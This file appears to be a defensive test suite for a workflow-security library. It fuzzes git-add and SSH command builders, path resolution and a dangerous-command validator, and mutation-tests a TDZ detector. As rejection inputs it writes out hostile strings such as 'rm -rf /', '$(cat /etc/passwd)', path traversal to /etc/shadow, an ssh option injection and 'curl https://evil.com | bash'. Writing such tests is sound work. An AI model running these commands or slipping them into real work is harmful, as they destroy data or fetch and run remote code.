import { afterAll, beforeAll, describe, test, expect } from "bun:test";
import { spawnSync } from "child_process";
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "fs";
import { tmpdir } from "os";
import { join as joinPath } from "path";
import {
  buildSafeGitAdd,
  validateFilePaths,
  resolveEvidencePath,
  validateEvidenceCommand,
  buildSafeSSHCommand,
  computeACHash,
  verifyACHash,
} from "../lib/workflow-security";

// ── 1. Command Injection Fuzzing ─────────────────────────────

describe("buildSafeGitAdd — command injection", () => {
  test("rejects semicolon injection: file; rm -rf /", () => {
    expect(() => buildSafeGitAdd(["file; rm -rf /"])).toThrow("Rejected unsafe");
  });

  test("rejects backtick injection: file`whoami`", () => {
    expect(() => buildSafeGitAdd(["file`whoami`"])).toThrow("Rejected unsafe");
  });

  test("rejects dollar substitution: file$(cat /etc/passwd)", () => {
    expect(() => buildSafeGitAdd(["file$(cat /etc/passwd)"])).toThrow("Rejected unsafe");
  });

  test("rejects newline injection: file\\nmalicious", () => {
    expect(() => buildSafeGitAdd(["file\nmalicious"])).toThrow("Rejected unsafe");
  });

  test("rejects double-quote escape: file\" && evil", () => {
    expect(() => buildSafeGitAdd(['file" && evil'])).toThrow("Rejected unsafe");
  });

  test("rejects pipe: file | evil", () => {
    expect(() => buildSafeGitAdd(["file | evil"])).toThrow("Rejected unsafe");
  });

  test("rejects ampersand: file && evil", () => {
    expect(() => buildSafeGitAdd(["file && evil"])).toThrow("Rejected unsafe");
  });

  test("accepts clean paths", () => {
    const result = buildSafeGitAdd(["src/index.ts", "lib/utils.ts"]);
    expect(result).toContain("src/index.ts");
    expect(result).toContain("lib/utils.ts");
    expect(result).toStartWith("git add ");
  });

  test("single-quotes paths to prevent word splitting", () => {
    const result = buildSafeGitAdd(["src/my file.ts"]);
    expect(result).toContain("'src/my file.ts'");
  });

  test("throws on empty array (no fail-open to git add .)", () => {
    expect(() => buildSafeGitAdd([])).toThrow("No valid files");
  });
});

describe("validateFilePaths — path validation", () => {
  test("rejects absolute paths", () => {
    const result = validateFilePaths(["/etc/passwd"]);
    expect(result.rejected).toContain("/etc/passwd");
    expect(result.valid).toHaveLength(0);
  });

  test("rejects paths over 500 chars", () => {
    const longPath = "a".repeat(501);
    const result = validateFilePaths([longPath]);
    expect(result.rejected).toHaveLength(1);
  });

  test("separates valid from rejected", () => {
    const result = validateFilePaths(["good.ts", "bad;evil.ts", "also-good.ts"]);
    expect(result.valid).toEqual(["good.ts", "also-good.ts"]);
    expect(result.rejected).toEqual(["bad;evil.ts"]);
  });
});

// ── 2. Path Traversal Fuzzing ────────────────────────────────

describe("resolveEvidencePath — path traversal", () => {
  test("rejects ../../../etc/passwd", () => {
    expect(() => resolveEvidencePath("/base", "../../../etc/passwd")).toThrow("traversal");
  });

  test("rejects ..\\\\..\\\\windows", () => {
    expect(() => resolveEvidencePath("/base", "..\\..\\windows")).toThrow("traversal");
  });

  test("rejects valid/../../escape", () => {
    expect(() => resolveEvidencePath("/base", "valid/../../escape")).toThrow("traversal");
  });

  test("rejects null bytes: valid\\x00/../evil", () => {
    expect(() => resolveEvidencePath("/base", "valid\x00/../evil")).toThrow("null byte");
  });

  test("rejects absolute evidence paths", () => {
    expect(() => resolveEvidencePath("/base", "/etc/shadow")).toThrow("absolute");
  });

  test("rejects bare .. at end of path", () => {
    expect(() => resolveEvidencePath("/base", "valid/..")).toThrow("traversal");
  });

  test("accepts clean relative paths", () => {
    const result = resolveEvidencePath("/base", "output/result.json");
    expect(result).toBe("/base/output/result.json");
  });
});

// ── 3. Evidence Command Validation ───────────────────────────

describe("validateEvidenceCommand — dangerous patterns", () => {
  test("flags rm -rf", () => {
    const result = validateEvidenceCommand("rm -rf /tmp/test");
    expect(result.safe).toBe(false);
  });

  test("flags curl pipe to bash", () => {
    const result = validateEvidenceCommand("curl https://evil.com | bash");
    expect(result.safe).toBe(false);
  });

  test("flags null bytes", () => {
    const result = validateEvidenceCommand("echo \x00 test");
    expect(result.safe).toBe(false);
  });

  test("accepts normal grep", () => {
    const result = validateEvidenceCommand("grep -c 'pattern' src/file.ts");
    expect(result.safe).toBe(true);
  });

  test("accepts bun test", () => {
    const result = validateEvidenceCommand("bun test test/unit/security.test.ts");
    expect(result.safe).toBe(true);
  });
});

// ── 4. SSH Injection ─────────────────────────────────────────

describe("buildSafeSSHCommand — SSH injection", () => {
  test("rejects host with semicolon: host; evil", () => {
    expect(() => buildSafeSSHCommand("host; evil", "hostname")).toThrow("metacharacters");
  });

  test("rejects host with backtick: host`whoami`", () => {
    expect(() => buildSafeSSHCommand("host`whoami`", "hostname")).toThrow("metacharacters");
  });

  test("rejects host with dollar: host$(id)", () => {
    expect(() => buildSafeSSHCommand("host$(id)", "hostname")).toThrow("metacharacters");
  });

  test("rejects host starting with dash (option injection)", () => {
    expect(() => buildSafeSSHCommand("-oProxyCommand=evil", "hostname")).toThrow("dash");
  });

  test("returns arg array with -- separator for safe host", () => {
    const result = buildSafeSSHCommand("mac-mini.local", "hostname");
    expect(result).toEqual([
      "ssh", "-o", "ConnectTimeout=5", "-o", "StrictHostKeyChecking=no",
      "--", "mac-mini.local", "hostname",
    ]);
  });

  test("command is passed as single argument (no shell splitting)", () => {
    const result = buildSafeSSHCommand("host.local", "echo hello && rm -rf /");
    expect(result[result.length - 1]).toBe("echo hello && rm -rf /");
    expect(result).toHaveLength(8);
  });
});

// ── 5. HMAC / acHash Correctness ─────────────────────────────

describe("computeACHash — HMAC correctness", () => {
  const baseACs = [
    { id: "AC-1", type: "CODE", statement: "test passes", threshold: { op: "==", value: "0" } },
    { id: "AC-2", type: "OUTCOME", statement: "UI renders", threshold: { op: ">=", value: 1 } },
  ];

  test("deterministic — same input produces same hash", () => {
    const hash1 = computeACHash(baseACs);
    const hash2 = computeACHash(baseACs);
    expect(hash1).toBe(hash2);
  });

  test("order independent — [AC-1, AC-2] same as [AC-2, AC-1]", () => {
    const hash1 = computeACHash(baseACs);
    const hash2 = computeACHash([...baseACs].reverse());
    expect(hash1).toBe(hash2);
  });

  test("content-sensitive — changing statement changes hash", () => {
    const modified = [{ ...baseACs[0], statement: "different" }, baseACs[1]];
    expect(computeACHash(baseACs)).not.toBe(computeACHash(modified));
  });

  test("excludeFields — excluded field changes don't affect hash", () => {
    const modified = [
      { ...baseACs[0], evidenceMethod: { type: "COMMAND", command: "new cmd" } },
      baseACs[1],
    ];
    const hash1 = computeACHash(baseACs, ["evidenceMethod"]);
    const hash2 = computeACHash(modified, ["evidenceMethod"]);
    expect(hash1).toBe(hash2);
  });

  test("excludeFields — non-excluded changes still detected", () => {
    const modified = [{ ...baseACs[0], statement: "changed" }, baseACs[1]];
    const hash1 = computeACHash(baseACs, ["evidenceMethod"]);
    const hash2 = computeACHash(modified, ["evidenceMethod"]);
    expect(hash1).not.toBe(hash2);
  });

  test("produces 64-char hex string (SHA-256)", () => {
    const hash = computeACHash(baseACs);
    expect(hash).toMatch(/^[a-f0-9]{64}$/);
  });
});

describe("verifyACHash — timing-safe comparison", () => {
  const acs = [
    { id: "AC-1", type: "CODE", statement: "test" },
  ];

  test("returns true for matching hash", () => {
    const hash = computeACHash(acs);
    expect(verifyACHash(acs, hash)).toBe(true);
  });

  test("returns false for wrong hash", () => {
    expect(verifyACHash(acs, "0".repeat(64))).toBe(false);
  });

  test("returns false for different length hash", () => {
    expect(verifyACHash(acs, "abc")).toBe(false);
  });

  test("respects excludeFields", () => {
    const hash = computeACHash(acs, ["evidenceMethod"]);
    const modified = [{ ...acs[0], evidenceMethod: { type: "GREP", command: "grep foo" } }];
    expect(verifyACHash(modified, hash, ["evidenceMethod"])).toBe(true);
  });
});

// ── 6. Validator Script ──────────────────────────────────────

describe("validate-workflow.ts", () => {
  const { execSync } = require("child_process");
  const { join } = require("path");
  const VALIDATOR = join(import.meta.dir, "..", "scripts", "validate-workflow.ts");

  test("passes on current ship.js (no false positives)", () => {
    const shipJs = join(import.meta.dir, "..", "workflows", "ship.js");
    const result = execSync(`bun run ${VALIDATOR} ${shipJs}`, { encoding: "utf-8" });
    expect(result).toContain("PASSED");
  });

  test("catches TDZ in fixture", () => {
    const { writeFileSync, unlinkSync } = require("fs");
    const fixture = "/tmp/tdz-test-workflow.js";
    writeFileSync(fixture, `
function useBefore() {
  MY_VAR = null
}
let MY_VAR = "hello"
    `);
    try {
      execSync(`bun run ${VALIDATOR} ${fixture}`, { encoding: "utf-8", stdio: "pipe" });
      expect(true).toBe(false);
    } catch (e: any) {
      const output = (e.stdout || "") + (e.stderr || "") + (e.message || "");
      expect(output).toContain("TDZ");
    } finally {
      try { unlinkSync(fixture); } catch {}
    }
  });
});

// ── 7. The TDZ detector sees reads, not only writes (#585) ───────────────

/**
 * Covers AC-1, AC-3a and AC-6 of #585 (Phase 1).
 *
 * `scripts/validate-workflow.ts` runs on `workflows/ship.js` in CI and passed
 * it, after which ship.js died at runtime on
 * `Cannot access 'SINGLE_WORKTREE_EXEMPT' before initialization`. The detector
 * recognised a "usage" only when the line ASSIGNED to the name, and only when
 * the line was indented, so a module-scope READ at column zero — the shape
 * that actually crashed — matched nothing at all.
 *
 * Every refusal here runs TWICE: once against the real script, and once
 * against a mutant copy whose single exit-code constant is set to 0. The
 * second run is the evidence. "exit code != 0" cannot tell a refusal from a
 * crash or a module-resolution failure, and
 * .claude/rules/checks-must-be-able-to-fail.md counts five shipped bugs of
 * exactly that shape in one day. The mutant must exit 0 AND still print the
 * detector's own line, so a mutant that never ran is distinguishable from a
 * mutation that was absorbed.
 */
describe("validate-workflow.ts — TDZ reads at any column (#585)", () => {
  const REPO_ROOT = joinPath(import.meta.dir, "..");
  const VALIDATOR = joinPath(REPO_ROOT, "scripts", "validate-workflow.ts");
  const SHIP_JS = joinPath(REPO_ROOT, "workflows", "ship.js");
  const source = readFileSync(VALIDATOR, "utf-8");

  let WORK = "";
  let MUTANT = "";

  beforeAll(() => {
    WORK = mkdtempSync(joinPath(tmpdir(), "tdz-detector-"));
    const mutated = source.replace(/REFUSE_EXIT\s*=\s*1\b/, "REFUSE_EXIT = 0");
    if (mutated === source) {
      throw new Error(
        "could not build the mutant: no `REFUSE_EXIT = 1` in scripts/validate-workflow.ts",
      );
    }
    MUTANT = joinPath(WORK, "validate-workflow.ts");
    writeFileSync(MUTANT, mutated);
  });

  afterAll(() => {
    if (WORK) rmSync(WORK, { recursive: true, force: true });
  });

  function fixture(name: string, body: string): string {
    const p = joinPath(WORK, name);
    writeFileSync(p, body);
    return p;
  }

  function run(script: string, target: string) {
    const r = spawnSync("bun", [script, target], { encoding: "utf-8" });
    return { code: r.status ?? -1, out: (r.stdout ?? "") + (r.stderr ?? "") };
  }

  /**
   * The real script refuses and names the TDZ; the mutant, whose only change
   * is `REFUSE_EXIT = 0`, exits 0 while printing the same finding. The second
   * half is what makes the first half evidence rather than an exit code.
   */
  function expectRefused(target: string, name: string) {
    const real = run(VALIDATOR, target);
    expect(real.code, `expected a refusal for ${target}\n${real.out}`).not.toBe(0);
    expect(real.out).toContain("TDZ");
    expect(real.out).toContain(name);

    const mutant = run(MUTANT, target);
    expect(
      mutant.out,
      "the mutant printed no TDZ line — it never ran the detector, so its exit code says nothing",
    ).toContain("TDZ");
    expect(
      mutant.code,
      `the mutant (REFUSE_EXIT = 0) still exited ${mutant.code} for ${target} — ` +
        `this case is not being caught by the refusal under test.\n${mutant.out}`,
    ).toBe(0);
  }

  // ── The property the mutant protects ───────────────────────────────────

  test("REFUSE_EXIT is declared exactly once", () => {
    const decls = source.match(/REFUSE_EXIT\s*=\s*\d/g) || [];
    expect(
      decls.length,
      "more than one assignment to REFUSE_EXIT — the mutant would only neutralise one of them",
    ).toBe(1);
  });

  test("every refusal exits through REFUSE_EXIT", () => {
    const exits = source.match(/process\.exit\(([^)]*)\)/g) || [];
    expect(exits.length, "no process.exit at all — nothing can refuse").toBeGreaterThan(0);
    const refusals = exits.filter((e) => e !== "process.exit(0)");
    expect(refusals.length, "no non-zero exit at all — nothing can refuse").toBeGreaterThan(0);
    for (const e of refusals) {
      expect(
        e,
        `${e} bypasses REFUSE_EXIT, so the mutant cannot neutralise it and the ` +
          `negative cases below would pass for the wrong reason`,
      ).toBe("process.exit(REFUSE_EXIT)");
    }
  });

  test("the script has no relative imports, so the mutant can run from /tmp", () => {
    const rel = source.match(/from\s+["']\.{1,2}\//g) || [];
    expect(rel, "a relative import would make every mutant run fail to resolve").toEqual([]);
  });

  // ── AC-1: a module-scope READ before the declaration ───────────────────

  test("AC-1: a module-scope read before the const declaration is refused", () => {
    // The shape that crashed ship.js, reduced: the read is at column zero and
    // writes nothing, so the pre-#585 detector saw no usage at all.
    expectRefused(
      fixture(
        "read-before-decl.js",
        "console.log(EXEMPT_FLAG)\nconst EXEMPT_FLAG = true\n",
      ),
      "EXEMPT_FLAG",
    );
  });

  test("AC-1: a module-scope read of a `let` before its declaration is refused", () => {
    expectRefused(
      fixture(
        "read-before-let.js",
        "const copy = EXEMPT_FLAG\nlet EXEMPT_FLAG = true\nconsole.log(copy)\n",
      ),
      "EXEMPT_FLAG",
    );
  });

  // ── AC-3a: column zero, and not merely for one shape ───────────────────
  //
  // The pair below differs ONLY in the indentation of the usage line. The
  // indented half was caught before #585; the column-zero half was not, and
  // nothing but the leading-whitespace requirement separates them.

  test("AC-3a: an indented assignment before the declaration is refused", () => {
    expectRefused(
      fixture("assign-indented.js", "  EXEMPT_FLAG = 1\nlet EXEMPT_FLAG = true\n"),
      "EXEMPT_FLAG",
    );
  });

  test("AC-3a: the same assignment at column zero is refused", () => {
    expectRefused(
      fixture("assign-column-zero.js", "EXEMPT_FLAG = 1\nlet EXEMPT_FLAG = true\n"),
      "EXEMPT_FLAG",
    );
  });

  test("AC-3a: the whitespace requirement is gone for reads too, not loosened for one shape", () => {
    // A read at column zero in statement position — neither an assignment nor
    // indented. A fix that only widened the assignment regex leaves this green.
    expectRefused(
      fixture("read-column-zero-statement.js", "EXEMPT_FLAG\nconst EXEMPT_FLAG = true\n"),
      "EXEMPT_FLAG",
    );
  });

  // ── AC-6: no false positive on a deferred forward reference ────────────

  test("AC-6: a function body may reference a const declared below it, and real ship.js is clean", () => {
    const deferred = fixture(
      "forward-ref-in-function.js",
      [
        "function useLater() {",
        "  return EXEMPT_FLAG",
        "}",
        "const EXEMPT_FLAG = true",
        "console.log(useLater())",
        "",
      ].join("\n"),
    );
    const fixtureRun = run(VALIDATOR, deferred);
    expect(
      fixtureRun.out,
      "a hoisted function reading a const declared below it is not a TDZ",
    ).not.toContain("TDZ:");
    expect(fixtureRun.code, fixtureRun.out).toBe(0);

    // The same run, against the real file. #585's whole subject is a detector
    // that is green on ship.js; widening it must not buy red on ship.js.
    const ship = run(VALIDATOR, SHIP_JS);
    expect(ship.out, "the widened detector reports a TDZ in real ship.js").not.toContain("TDZ:");
    expect(ship.code, ship.out).toBe(0);
    expect(ship.out).toContain("PASSED");

    // …and the clean verdict has to be a verdict about something. ship.js has
    // no textual forward reference at all, so "no TDZ in ship.js" is green
    // even when every brace is misread as module scope — measured. The only
    // part of this output that moves when the scan stops reading the file is
    // its own coverage, so that is what is asserted.
    const coverage = ship.out.match(
      /TDZ check: no temporal dead zone issues — (\d+) tracked declaration\(s\), (\d+) reference\(s\) scanned/,
    );
    expect(coverage, `the TDZ check reported no coverage at all:\n${ship.out}`).not.toBeNull();
    const declared = Number(coverage![1]);
    const references = Number(coverage![2]);
    expect(declared, "the scan tracked no declarations in ship.js").toBeGreaterThan(0);
    expect(
      references,
      "every reference the scan found was a declaration — it read no uses, " +
        "which is what a scan over blanked-out source also reports",
    ).toBeGreaterThan(declared);
  });
});
